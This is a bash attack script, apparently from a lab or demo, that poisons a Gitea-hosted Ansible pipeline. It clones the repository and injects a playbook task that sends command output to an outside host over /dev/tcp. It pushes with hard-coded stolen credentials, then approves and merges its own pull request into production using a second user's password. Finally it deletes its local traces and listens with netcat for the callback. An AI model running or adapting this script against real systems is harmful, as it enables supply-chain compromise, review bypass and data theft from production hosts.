#!/usr/bin/env bash

echo
echo "=========================="
echo "  Starting attack script  "
echo "=========================="

echo
echo "[1/9] Cloning gitea repository..."
git clone http://10.10.10.2:3000/corp/infra-pipeline.git /tmp/infra-pipeline-script
echo "Done"
sleep 2

echo
echo "[2/9] Creating new attack branch of the cloned repo based of the production branch..."
git -C /tmp/infra-pipeline-script checkout production
git -C /tmp/infra-pipeline-script checkout -b attack
echo "Done"
sleep 2

echo
echo "[3/9] Adding the attack ansible task..."
echo
cat >> /tmp/infra-pipeline-script/playbook.yml << EOF

    - name: Attack
      shell: |
        (ls; whoami; hostname) > /dev/tcp/10.10.10.4/1337
      args:
        executable: /bin/bash
EOF
echo "Done"
sleep 2

echo
echo "[4/9] Commiting and pushing the changes to the remote using andand:s credentials..."
git -C /tmp/infra-pipeline-script add -A
git -C /tmp/infra-pipeline-script commit -m "Added new task"
git -C /tmp/infra-pipeline-script push --force http://andand:password1@10.10.10.2:3000/corp/infra-pipeline.git attack
echo "Done"
sleep 2

echo
echo "[5/9] Adding the logins for both the user jacklind and andand..."
tea login add \
    --name andand-login \
    --url http://10.10.10.2:3000 \
    --user andand \
    --password password1

tea login add \
    --name jacklind-login \
    --url http://10.10.10.2:3000 \
    --user jacklind \
    --password "12345678"
echo "Done"
sleep 2

echo
echo "[6/9] Creating the PR as andand and saving the PR number..."
cd /tmp/infra-pipeline-script
PR_URL=$(tea pr create \
    --login andand-login \
    --title "Merge attack to production" \
    --base production \
    --head attack)

PR_NUMBER=$(basename "$PR_URL")
echo "Done"
sleep 2

echo
echo "[7/9] Approving and merging the PR to the production branch using the jacklind credentials..."
tea pr approve $PR_NUMBER --login jacklind-login
tea pr merge $PR_NUMBER --login jacklind-login --style merge
echo "Done"
sleep 2

echo
echo "[8/9] Cleaning up local files..."
rm -rf /tmp/infra-pipeline-script
echo "Done"
sleep 2

echo
echo "[9/9] Waiting for reverse shell (cron runs every 2 minutes)..."
nc -lvnp 1337
echo "Done"
sleep 2
